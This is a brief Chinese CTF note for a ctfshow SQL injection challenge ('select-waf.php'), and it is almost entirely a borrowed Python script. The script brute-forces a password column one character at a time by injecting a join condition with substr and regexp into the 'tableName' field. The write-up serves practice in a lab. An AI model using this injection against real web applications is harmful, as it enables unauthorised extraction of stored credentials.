[[ctfshow183sql过滤与爆破]]的升级版
直接上别人的wp：

```
import requests
url = "http://29eaa11f-1ab7-4b93-9fb7-bd2b43e3daba.challenge.ctf.show/select-waf.php"

flag = 'ctfshow{'
for i in range(45):
    if i <= 8:
        continue
    for  j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"
        }
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j) != ".":
                flag += chr(j)
                print(flag.lower())
                if chr(j) == "}":
                    flag += chr(j)
                    exit(0)
                break
print(flag.lower()+'}')
```